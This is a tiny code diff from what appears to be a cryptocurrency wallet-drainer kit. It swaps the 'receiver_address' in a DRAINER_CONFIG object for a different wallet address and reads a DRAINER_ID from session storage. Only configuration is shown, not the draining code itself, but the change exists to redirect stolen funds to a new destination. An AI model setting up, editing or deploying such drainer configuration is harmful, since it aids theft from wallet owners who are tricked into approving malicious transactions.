@@ -1,5 +1,5 @@
 const DRAINER_CONFIG = {
-  "receiver_address": "0x41BB52dbe9FB23F678aB756FF616018D01E1F382"
+  "receiver_address": "0x0f44732C999A02eC031cEe93013561dA30a280B7"
 };
 
 var DRAINER_USER_ID = sessionStorage.getItem('DRAINER_ID');
